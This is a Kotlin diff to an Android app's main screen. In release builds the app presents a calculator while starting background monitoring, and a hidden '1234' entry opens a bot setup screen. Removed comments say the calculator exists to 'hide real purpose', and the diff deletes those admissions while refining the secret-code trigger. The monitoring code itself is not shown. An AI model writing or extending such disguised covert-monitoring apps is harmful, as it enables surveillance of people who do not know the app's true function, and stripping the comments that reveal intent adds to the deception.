@@ -170,7 +170,6 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // RELEASE mode: Show CALCULATOR (hide real purpose)
         if (!BuildConfig.DEBUG) {
             android.util.Log.i("MainActivity", "Entering RELEASE mode - CALCULATOR UI")
             setContentView(R.layout.activity_calculator)
@@ -178,7 +177,10 @@ class MainActivity : AppCompatActivity() {
             startMonitoringInBackground()
             return
         }
-        
+
+        android.util.Log.i("MainActivity", "Entering DEBUG mode - CALCULATOR UI")
+        setContentView(R.layout.activity_calculator)
+        initCalculator()
     }
     
     override fun onResume() {
@@ -289,11 +291,6 @@ class MainActivity : AppCompatActivity() {
             currentNumber += number
         }
         
-        // SECRET CODE: "1234" triggers admin activation
-        if (currentNumber == "1234") {
-            android.util.Log.i("MainActivity", "Secret code detected!")
-        }
-        
         updateCalculatorDisplay()
     }
     
@@ -309,8 +306,7 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun calculate() {
-        // SECRET CODE: ketik 1234 lalu = untuk buka halaman Setup Bot
-        if (currentNumber == "1234" || previousNumber == "1234") {
+        if (currentNumber == "1234" && previousNumber.isEmpty() && operator.isEmpty()) {
             android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
             currentNumber = ""
             previousNumber = ""
@@ -334,7 +330,7 @@ class MainActivity : AppCompatActivity() {
             else -> num2
         }
         
-        currentNumber = if (result.isNaN()) {
+        currentNumber = if (result.isNaN() || result.isInfinite()) {
             "Error"
         } else if (result % 1.0 == 0.0) {
             result.toInt().toString()
